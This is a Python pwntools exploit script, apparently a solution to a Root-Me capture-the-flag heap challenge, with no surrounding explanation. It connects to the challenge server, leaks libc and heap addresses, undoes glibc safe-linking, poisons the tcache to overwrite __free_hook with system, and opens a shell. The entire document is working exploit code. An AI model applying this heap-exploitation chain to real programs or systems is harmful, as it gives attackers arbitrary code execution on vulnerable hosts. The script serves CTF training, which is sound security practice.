#!/usr/bin/env python3
from pwn import *
context.update(os="linux", arch = "amd64", log_level="debug")
exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")
context.binary = exe
#p = process("./chall_patched")
p = remote("challenge03.root-me.org", 56589)
def alpha(heap, target):
    return target ^ (heap >> 0xc)

def x(): gdb.attach(p)
def sl(choice): p.sendlineafter(b"Choice?\n", str(choice))
def add(idx,size,content:bytes):
    sl(1)
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", content)

def free(idx):
    sl(2)
    p.sendlineafter("Index:", str(idx))

def edit(idx,content:bytes):
    sl(3)
    p.sendlineafter("Index:", str(idx))
    p.sendafter("Data:", content)
def show(idx):
    sl(4)
    p.sendlineafter("Index:", str(idx))

def freeze(idx):
    sl(5)
    p.sendlineafter("Index:", str(idx))

def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def main():
    add(0, 0x428, b"A"*8)
    add(1 ,0x18, b"B"*8)
    freeze(0)
    free(0)
    add(2, 0x438, b"E" * 8)
    show(0)
    print(p.recvline())
    print(p.recvline())
    libc_base = u64(p.recvline().strip(b"\n").ljust(8,b"\x00")) - 0x1e3ff0
    print(hex(libc_base))
    add(3, 0x20, b"X" * 8)
    add(4, 0x20, b"Z" * 8)
    add(5, 0x18, b"/bin/sh\x00")
    free(4)
    free(3)
    show(0)
    print(p.recvline())
    print(p.recvline())
    leak = u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
    heap_base = decrypt(leak) -0x2d0#- 0x6e0
    print(hex(heap_base))
    system = libc_base + libc.sym.system
    hook = libc_base + libc.sym.__free_hook
    hook = alpha(heap_base, hook)
    edit(0, p64(hook))
    add(6, 0x20, b"A" * 8)
    add(7, 0x20, p64(system))
    p.interactive()

if __name__ == "__main__":
    main()
